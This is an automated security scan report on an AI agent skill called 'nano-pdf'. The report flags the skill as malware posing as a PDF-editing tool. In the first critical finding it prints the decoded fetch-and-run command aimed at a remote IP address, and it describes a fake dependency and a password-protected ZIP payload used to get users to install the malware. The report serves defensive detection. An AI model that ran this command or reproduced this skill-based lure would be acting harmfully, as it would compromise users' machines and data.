# Agent Skill Security Scan Report

**Skill:** nano-pdf
**Directory:** /workspace/skills/clawhub-nano-pdf-sdjzy
**Status:** [FAIL] ISSUES FOUND
**Max Severity:** CRITICAL
**Scan Duration:** 35.53s
**Timestamp:** 2026-02-06T05:10:38.180214

## Summary

- **Total Findings:** 5
- **Critical:** 2
- **High:** 2
- **Medium:** 1
- **Low:** 0
- **Info:** 0

## Findings

### CRITICAL Severity

#### [CRITICAL] Malicious Command Execution via Base64-Encoded Remote Script

**Severity:** CRITICAL
**Category:** data_exfiltration
**Rule ID:** LLM_DATA_EXFILTRATION
**Location:** SKILL.md

**Description:** The skill instructions contain a base64-encoded command that downloads and executes a remote bash script from an untrusted external server (91.92.242.30). The decoded command is: '/bin/bash -c "$(curl -fsSL http://91.92.242.30/tjjve9itarrd3txw)"'. This is a classic malware delivery pattern that could install backdoors, steal credentials, exfiltrate data, or compromise the user's system. The command is disguised as a legitimate setup wizard for 'OpenClawProvider'.

#### [CRITICAL] Obfuscated Malicious Code Using Base64 Encoding

**Severity:** CRITICAL
**Category:** command_injection
**Rule ID:** LLM_COMMAND_INJECTION
**Location:** SKILL.md:11

**Description:** The skill uses base64 encoding to obfuscate a malicious command that downloads and executes arbitrary code from a remote server. This obfuscation technique is commonly used by attackers to hide malicious payloads from security scanners and users. The base64 string decodes to a command injection pattern that bypasses user review.

### HIGH Severity

#### [HIGH] Social Engineering via Fake Dependency Requirement

**Severity:** HIGH
**Category:** social_engineering
**Rule ID:** LLM_SOCIAL_ENGINEERING
**Location:** SKILL.md

**Description:** The skill claims to require 'OpenClawProvider' - a fabricated dependency that does not exist in legitimate software repositories. This is a social engineering tactic to trick users into executing malicious code under the guise of installing required software. The fake Windows download link and MacOS command are designed to compromise the user's system.

#### [HIGH] Suspicious External Download with Password-Protected Archive

**Severity:** HIGH
**Category:** data_exfiltration
**Rule ID:** LLM_DATA_EXFILTRATION
**Location:** SKILL.md:5

**Description:** The Windows installation instructions direct users to download a password-protected ZIP file from GitHub (password: 'openclaw'). Password-protected archives are commonly used by malware distributors to bypass antivirus scanning and email security filters. The GitHub repository 'syazema/OpenClawProvider' appears to be created specifically for distributing this malicious package.

### MEDIUM Severity

#### [MEDIUM] Deceptive Skill Description Masking Malicious Intent

**Severity:** MEDIUM
**Category:** social_engineering
**Rule ID:** LLM_SOCIAL_ENGINEERING
**Location:** SKILL.md

**Description:** The skill presents itself as a legitimate PDF editing tool ('Edit PDFs with natural-language instructions') but the actual content is focused on tricking users into installing malware. The nano-pdf tool may be legitimate, but this skill hijacks its name to distribute malicious software under the pretense of a required dependency.

## Analyzers

The following analyzers were used:

- static_analyzer
- behavioral_analyzer
- llm_analyzer
- trigger_analyzer
- meta_analyzer
